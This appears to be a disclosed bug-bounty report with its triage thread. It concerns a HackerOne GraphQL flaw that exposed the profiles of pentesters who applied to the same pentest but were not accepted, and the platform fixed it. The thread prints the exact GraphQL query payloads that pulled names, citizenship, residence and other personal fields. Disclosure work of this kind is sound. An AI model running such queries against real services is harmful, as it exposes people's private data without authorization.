title: Pentester can obtain information about other pentesters who applied for the same test, but weren't accepted

profile.name: HackerOne
profile.about: Vulnerability disclosure should be safe, transparent, and rewarding.

vulnerability_information:
Hi team, 

I don't know your policy about pentesters(about their visibility on the platform), But I couldn't find any other pentesters before.

1) For example:
GraphQL has the `h1_pentester` attribute that would explicitly point us to the pentester, but if we make a query, it doesn't reveal the pentester to us.

https://hackerone.com/graphql
POST
 `{"query":"query { user(username:\\"███\\"){username,h1_pentester}}","variables":{}}`

Answer:
`{"data":{"user":{"username":"███████","h1_pentester":null}}}`

As we can see, I can't say that he is a pentester. And if I understand the policy correctly in this situation, H1 does not disclose to others who the pentester 

2) PoC:

https://hackerone.com/graphql
POST
 `{"query":"query { pentester_profiles{total_count,nodes{skills{nodes{name}},state,user{username}}}}","variables":{}}`

Answer:

`{"data":{"pentester_profiles":{"total_count":8,"nodes":[{"skills":{"nodes":[{"name":"Web Applications"},{"name":"Mobile Applications"},{"name":"Native Applications"},{"name":"Android"},{"name":"iOS"},{"name":"API"}]},"state":"approved","user":{"username":"█████"}},{"skills":{"nodes":[{"name":"Web Applications"},{"name":"Mobile Applications"},{"name":"Network Security"},{"name":"Android"},{"name":"iOS"},{"name":"API"},{"name":"Web applications"}]},"state":"approved","user":{"username":"██████"}},{"skills":{"nodes":[{"name":"Web Applications"},{"name":"Mobile Applications"},{"name":"Native Applications"},{"name":"Network Security"},{"name":"Android"},{"name":"iOS"},{"name":"API"}]},"state":"approved","user":{"username":"█████"}},{"skills":{"nodes":[{"name":"Mobile Applications"},{"name":"Web Applications"},{"name":"Android"}]},"state":"approved","user":{"username":"nahamsec"}},{"skills":{"nodes":[{"name":"Web Applications"},{"name":"Mobile Applications"},{"name":"Native Applications"},{"name":"Network Security"},{"name":"Android"},{"name":"iOS"},{"name":"API"}]},"state":"approved","user":{"username":"███████"}},{"skills":{"nodes":[{"name":"Mobile Applications"},{"name":"Native Applications"},{"name":"Web Applications"},{"name":"Windows Mobile"},{"name":"Android"},{"name":"API"}]},"state":"approved","user":{"username":"██████"}},{"skills":{"nodes":[{"name":"Web Applications"},{"name":"Android"},{"name":"API"}]},"state":"approved","user":{"username":"fisher"}},{"skills":{"nodes":[]},"state":"approved","user":{"username":"haxta4ok00"}}]}}}`

As far as I can tell from the GraphQL response, there are only 8 approved pentesters on the platform. Also, I see their skills. Maybe it makes sense if I find out about the pentester when I start participating in the pentest, but we can find out about them without participating in the pentest. If I made a mistake in this direction, please let me know, since I am not familiar with the pentester policy and I will close the report myself, thank you!

For HackerOne triager , I'm not sure that you will be able to reproduce this query, I think you need to have the role - `h1_penteste` , thank you!

## Impact

Disclosed pentesters
vulnerability_information_html:
Hi team,

I don't know your policy about pentesters(about their visibility on the platform), But I couldn't find any other pentesters before.

1) For example:
GraphQL has the h1_pentester attribute that would explicitly point us to the pentester, but if we make a query, it doesn't reveal the pentester to us.

https://hackerone.com/graphql
POST
{"query":"query { user(username:\\"███\\"){username,h1_pentester}}","variables":{}}

Answer:
{"data":{"user":{"username":"███████","h1_pentester":null}}}

As we can see, I can't say that he is a pentester. And if I understand the policy correctly in this situation, H1 does not disclose to others who the pentester

2) PoC:

https://hackerone.com/graphql
POST
{"query":"query { pentester_profiles{total_count,nodes{skills{nodes{name}},state,user{username}}}}","variables":{}}

Answer:

{"data":{"pentester_profiles":{"total_count":8,"nodes":[{"skills":{"nodes":[{"name":"Web Applications"},{"name":"Mobile Applications"},{"name":"Native Applications"},{"name":"Android"},{"name":"iOS"},{"name":"API"}]},"state":"approved","user":{"username":"█████"}},{"skills":{"nodes":[{"name":"Web Applications"},{"name":"Mobile Applications"},{"name":"Network Security"},{"name":"Android"},{"name":"iOS"},{"name":"API"},{"name":"Web applications"}]},"state":"approved","user":{"username":"██████"}},{"skills":{"nodes":[{"name":"Web Applications"},{"name":"Mobile Applications"},{"name":"Native Applications"},{"name":"Network Security"},{"name":"Android"},{"name":"iOS"},{"name":"API"}]},"state":"approved","user":{"username":"█████"}},{"skills":{"nodes":[{"name":"Mobile Applications"},{"name":"Web Applications"},{"name":"Android"}]},"state":"approved","user":{"username":"nahamsec"}},{"skills":{"nodes":[{"name":"Web Applications"},{"name":"Mobile Applications"},{"name":"Native Applications"},{"name":"Network Security"},{"name":"Android"},{"name":"iOS"},{"name":"API"}]},"state":"approved","user":{"username":"███████"}},{"skills":{"nodes":[{"name":"Mobile Applications"},{"name":"Native Applications"},{"name":"Web Applications"},{"name":"Windows Mobile"},{"name":"Android"},{"name":"API"}]},"state":"approved","user":{"username":"██████"}},{"skills":{"nodes":[{"name":"Web Applications"},{"name":"Android"},{"name":"API"}]},"state":"approved","user":{"username":"fisher"}},{"skills":{"nodes":[]},"state":"approved","user":{"username":"haxta4ok00"}}]}}}

As far as I can tell from the GraphQL response, there are only 8 approved pentesters on the platform. Also, I see their skills. Maybe it makes sense if I find out about the pentester when I start participating in the pentest, but we can find out about them without participating in the pentest. If I made a mistake in this direction, please let me know, since I am not familiar with the pentester policy and I will close the report myself, thank you!

For HackerOne triager , I'm not sure that you will be able to reproduce this query, I think you need to have the role - h1_penteste , thank you!

Impact

Disclosed pentesters

activities.message:
Hi @haxta4ok00, 

Thank you for your submission! You are right, looks like only the users with the pentester role can query this, I will check with the team if this is expected or not. 

Regards.
activities.markdown_message:
Hi @haxta4ok00,

Thank you for your submission! You are right, looks like only the users with the pentester role can query this, I will check with the team if this is expected or not.

Regards.

activities.message:
Hi team, I ran some more tests with this report.

1) I believe there are many more pentesters on the platform (more than 8) :) 
2) It looks like this query is working because these 8 people didn't finish their pentester profile - `"is_complete":null` . This is the only explanation for the similarity. Also, judging by the attribute `"visible_in_directory":false`, we should not be visible in the pentesters directory - https://hackerone.com/directory/pentesters.
3) `Personal information, such as your name, bio, and social media handles will not be displayed on your HackerOne profile.` - This is written in the pentester profile editor.

Also, I see the names of the pentesters . I was lucky, for example this is @fisher. If we look at his regular profile, it doesn't show his first and last name. But specified in the pentester profile. - `"name":"███"`
activities.markdown_message:
Hi team, I ran some more tests with this report.

1) I believe there are many more pentesters on the platform (more than 8) :)
2) It looks like this query is working because these 8 people didn't finish their pentester profile - "is_complete":null . This is the only explanation for the similarity. Also, judging by the attribute "visible_in_directory":false, we should not be visible in the pentesters directory - https://hackerone.com/directory/pentesters.
3) Personal information, such as your name, bio, and social media handles will not be displayed on your HackerOne profile. - This is written in the pentester profile editor.

Also, I see the names of the pentesters . I was lucky, for example this is @fisher. If we look at his regular profile, it doesn't show his first and last name. But specified in the pentester profile. - "name":"███"

activities.message: Hi @haxta4ok00 - nice debugging! I looked at the code and there are three possible ways you could see these objects: it's your own pentester profile, they're approved and visible in the directory, or you're in a pentest with them. It seems that all of those apply to the 8 objects you're seeing. Can you confirm? Thanks!
activities.markdown_message: Hi @haxta4ok00 - nice debugging! I looked at the code and there are three possible ways you could see these objects: it's your own pentester profile, they're approved and visible in the directory, or you're in a pentest with them. It seems that all of those apply to the 8 objects you're seeing. Can you confirm? Thanks!

activities.message:
Hi @jobert -- No, I was in the same pentest, but only with @fisher and @nahamsec 

> they're approved and visible in the directory

In my case the attribute `visible_in_directory` returns `false` for all :)
activities.markdown_message:
Hi @jobert -- No, I was in the same pentest, but only with @fisher and @nahamsec

they're approved and visible in the directory

In my case the attribute visible_in_directory returns false for all :)

activities.message:
Full query:

https://hackerone.com/graphql
POST

````
{"query":"query{pentester_profiles{total_count,nodes{bio,certifications_pentester_profiles{nodes{_id,certification{name,short_name},certification_identifier,ends_at,starts_at}},citizenship,cobalt_handle,completed_pentests_number,compliance_frameworks,is_complete,languages,led_pentest,linkedin_handle,name,preferred_times,residence,skills{nodes{name}},state,time_zone,,tools,user{username},visible_in_directory,weekdays,work_schedule,years_experience}}}","variables":{}}
```

██████


If I try to add an attribute `approved` or `preferred_teammates` my request is not processed
activities.markdown_message:
Full query:

https://hackerone.com/graphql
POST

{"query":"query{pentester_profiles{total_count,nodes{bio,certifications_pentester_profiles{nodes{_id,certification{name,short_name},certification_identifier,ends_at,starts_at}},citizenship,cobalt_handle,completed_pentests_number,compliance_frameworks,is_complete,languages,led_pentest,linkedin_handle,name,preferred_times,residence,skills{nodes{name}},state,time_zone,,tools,user{username},visible_in_directory,weekdays,work_schedule,years_experience}}}","variables":{}}

██████

If I try to add an attribute approved or preferred_teammates my request is not processed

activities.message: Hi @haxta4ok00 - it turns out that the other profiles you're seeing are people who signed up for the same pentest, but they weren't picked for the pentest (only @fisher, @nahamsec, and you were). This might be unexpected, so let me double check this with the team that works on this and get back to you!
activities.markdown_message: Hi @haxta4ok00 - it turns out that the other profiles you're seeing are people who signed up for the same pentest, but they weren't picked for the pentest (only @fisher, @nahamsec, and you were). This might be unexpected, so let me double check this with the team that works on this and get back to you!

activities.message: Thanks again for bringing to our attention, it's much appreciated!
activities.markdown_message: Thanks again for bringing to our attention, it's much appreciated!

activities.message: Hi @haxta4ok00 - the team deployed a fix, can you verify it? Thanks!
activities.markdown_message: Hi @haxta4ok00 - the team deployed a fix, can you verify it? Thanks!

activities.message: Hi @jobert -- looks like a fixed, Now I only see those with whom I participated in the pentest - @fisher and @nahamsec
activities.markdown_message: Hi @jobert -- looks like a fixed, Now I only see those with whom I participated in the pentest - @fisher and @nahamsec
